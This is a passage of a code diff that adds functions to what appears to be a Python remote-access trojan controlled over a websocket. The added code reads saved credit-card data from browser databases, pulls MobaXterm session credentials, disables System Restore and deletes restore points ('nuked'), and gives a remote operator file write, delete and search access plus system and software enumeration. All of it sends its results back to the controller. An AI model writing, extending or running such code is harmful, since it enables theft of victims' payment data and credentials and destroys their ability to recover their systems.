+                "Edge": os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data", "Default", "Web Data"),
+            }
+            db_path = paths_map.get(browser)
+            if db_path and os.path.exists(db_path):
+                import shutil, sqlite3
+                temp = os.path.join(os.getenv("TEMP", ""), f"{browser.lower()}_payments_tmp")
+                try:
+                    shutil.copy2(db_path, temp)
+                    conn = sqlite3.connect(temp)
+                    cur = conn.cursor()
+                    try:
+                        cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
+                        for row in cur.fetchall():
+                            payments.append({"browser": browser, "name": row[0], "expiry": f"{row[1]}/{row[2]}", "number": "[encrypted]"})
+                    except:
+                        pass
+                    try:
+                        cur.execute("SELECT * FROM local_credit_cards")
+                        cols = [d[0] for d in cur.description]
+                        for row in cur.fetchall():
+                            payments.append({"browser": browser, "type": "local_card", "data": dict(zip(cols, row))})
+                    except:
+                        pass
+                    conn.close()
+                    os.remove(temp)
+                except:
+                    pass
+        await self.websocket.send(json.dumps({"type": "browser_payments", "payments": payments}))
+
+    async def _delete_restore_points(self):
+        """Delete all System Restore Points."""
+        try:
+            out = subprocess.check_output("powershell -Command \"Disable-ComputerRestore -Drive 'C:\\'; Checkpoint-Computer -Description 'Trigger' -RestorePointType MODIFY_SETTINGS; Remove-Item -Path 'C:\\System Volume Information\\*' -Recurse -Force -ErrorAction SilentlyContinue\"", shell=True, stderr=subprocess.STDOUT).decode("utf-8", errors="ignore")
+            await self.websocket.send(json.dumps({"type": "command_output", "output": f"Restore points nuked.\n{out}"}))
+        except Exception as e:
+            await self.websocket.send(json.dumps({"type": "command_output", "output": f"Restore point deletion failed: {e}"}))
+
+    async def _get_mobaxterm_creds(self):
+        """Extract MobaXTerm saved session credentials."""
+        creds = []
+        moba_dir = os.path.join(os.getenv("USERPROFILE", ""), "Documents", "MobaXterm")
+        if not os.path.exists(moba_dir):
+            moba_dir = os.path.join(os.getenv("USERPROFILE", ""), "AppData", "Local", "MobaXterm")
+        ini_path = os.path.join(moba_dir, "MobaXterm.ini")
+        if os.path.exists(ini_path):
+            try:
+                with open(ini_path, "r", errors="ignore") as f:
+                    lines = f.readlines()
+                session = {}
+                for line in lines:
+                    line = line.strip()
+                    if line.startswith("[") and line.endswith("]"):
+                        if session:
+                            creds.append(session)
+                        session = {"section": line}
+                    elif "=" in line:
+                        k, v = line.split("=", 1)
+                        session[k.strip()] = v.strip()
+                if session:
+                    creds.append(session)
+            except:
+                pass
+        await self.websocket.send(json.dumps({"type": "mobaxterm_creds", "creds": creds[:10]}))
+
+    # --- FILE MANAGER OPERATIONS ---
+    async def delete_file(self, path):
+        try:
+            if os.path.isdir(path):
+                shutil.rmtree(path)
+            else:
+                os.remove(path)
+            await self.websocket.send(json.dumps({"type": "file_op_result", "action": "delete", "path": path, "success": True}))
+        except Exception as e:
+            await self.websocket.send(json.dumps({"type": "file_op_result", "action": "delete", "path": path, "success": False, "error": str(e)}))
+
+    async def rename_file(self, path, new_name):
+        try:
+            parent = os.path.dirname(path)
+            new_path = os.path.join(parent, new_name)
+            os.rename(path, new_path)
+            await self.websocket.send(json.dumps({"type": "file_op_result", "action": "rename", "path": path, "new_path": new_path, "success": True}))
+        except Exception as e:
+            await self.websocket.send(json.dumps({"type": "file_op_result", "action": "rename", "path": path, "success": False, "error": str(e)}))
+
+    async def create_dir(self, path):
+        try:
+            os.makedirs(path, exist_ok=True)
+            await self.websocket.send(json.dumps({"type": "file_op_result", "action": "mkdir", "path": path, "success": True}))
+        except Exception as e:
+            await self.websocket.send(json.dumps({"type": "file_op_result", "action": "mkdir", "path": path, "success": False, "error": str(e)}))
+
+    async def get_file_info(self, path):
+        try:
+            stat = os.stat(path)
+            info = {
+                "name": os.path.basename(path),
+                "path": path,
+                "is_dir": os.path.isdir(path),
+                "size": stat.st_size,
+                "modified": stat.st_mtime,
+                "created": stat.st_ctime,
+                "attributes": ""
+            }
+            await self.websocket.send(json.dumps({"type": "file_info", **info}))
+        except Exception as e:
+            await self.websocket.send(json.dumps({"type": "file_info", "path": path, "error": str(e)}))
+
+    async def search_files(self, root, pattern):
+        try:
+            matches = []
+            for root_dir, dirs, files in os.walk(root):
+                for f in files:
+                    if pattern.lower() in f.lower():
+                        full = os.path.join(root_dir, f)
+                        try:
+                            sz = os.path.getsize(full)
+                        except:
+                            sz = 0
+                        matches.append({"name": f, "path": full, "is_dir": False, "size": sz})
+                for d in dirs:
+                    if pattern.lower() in d.lower():
+                        full = os.path.join(root_dir, d)
+                        matches.append({"name": d, "path": full, "is_dir": True, "size": 0})
+                if len(matches) > 500:
+                    break
+            await self.websocket.send(json.dumps({"type": "search_results", "query": pattern, "results": matches}))
+        except Exception as e:
+            await self.websocket.send(json.dumps({"type": "search_results", "query": pattern, "error": str(e)}))
+
+    async def write_file_content(self, path, content_b64):
+        try:
+            data = base64.b64decode(content_b64)
+            with open(path, "wb") as f:
+                f.write(data)
+            await self.websocket.send(json.dumps({"type": "file_op_result", "action": "write", "path": path, "success": True}))
+        except Exception as e:
+            await self.websocket.send(json.dumps({"type": "file_op_result", "action": "write", "path": path, "success": False, "error": str(e)}))
+
+    async def get_disk_usage(self):
+        try:
+            drives = []
+            for part in psutil.disk_partitions():
+                try:
+                    usage = psutil.disk_usage(part.mountpoint)
+                    drives.append({
+                        "device": part.device, "mount": part.mountpoint, "fstype": part.fstype,
+                        "total": usage.total, "used": usage.used, "free": usage.free, "percent": usage.percent
+                    })
+                except:
+                    pass
+            await self.websocket.send(json.dumps({"type": "disk_usage", "drives": drives}))
+        except Exception as e:
+            await self.websocket.send(json.dumps({"type": "disk_usage", "error": str(e)}))
+
+    async def get_detailed_system_info(self):
+        try:
+            import platform
+            boot = psutil.boot_time()
+            cpu_freq = psutil.cpu_freq()
+            info = {
+                "os": f"{platform.system()} {platform.release()} {platform.version()}",
+                "machine": platform.machine(),
+                "processor": platform.processor(),
+                "hostname": platform.node(),
+                "cpu_count": psutil.cpu_count(logical=True),
+                "cpu_physical": psutil.cpu_count(logical=False),
+                "cpu_freq_mhz": cpu_freq.current if cpu_freq else 0,
+                "ram_total": psutil.virtual_memory().total,
+                "ram_available": psutil.virtual_memory().available,
+                "boot_time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(boot)),
+                "uptime_seconds": int(time.time() - boot),
+            }
+            await self.websocket.send(json.dumps({"type": "detailed_system_info", **info}))
+        except Exception as e:
+            await self.websocket.send(json.dumps({"type": "detailed_system_info", "error": str(e)}))
+
+    async def get_installed_software(self):
+        try:
+            import winreg
+            software = []
+            for hive, key_name in [
+                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
+                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
+                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
+            ]:
+                try:
+                    key = winreg.OpenKey(hive, key_name)
+                    for i in range(winreg.QueryInfoKey(key)[0]):
+                        sub = winreg.EnumKey(key, i)
+                        try:
+                            sk = winreg.OpenKey(key, sub)
+                            name, _ = winreg.QueryValueEx(sk, "DisplayName")
+                            software.append(name)
+                            winreg.CloseKey(sk)
+                        except:
+                            pass
+                    winreg.CloseKey(key)
+                except:
+                    pass
+            await self.websocket.send(json.dumps({"type": "installed_software", "software": sorted(set(software))}))
+        except Exception as e:
+            await self.websocket.send(json.dumps({"type": "installed_software", "error": str(e)}))
+
+    async def copy_move_file(self, src, dst, is_move=False):
+        try:
+            if is_move:
+                shutil.move(src, dst)
+            else:
+                shutil.copy2(src, dst)
+            await self.websocket.send(json.dumps({"type": "file_op_result", "action": "move" if is_move else "copy", "path": src, "new_path": dst, "success": True}))
+        except Exception as e:
+            await self.websocket.send(json.dumps({"type": "file_op_result", "action": "move" if is_move else "copy", "path": src, "success": False, "error": str(e)}))
 
 
 if __name__ == "__main__":
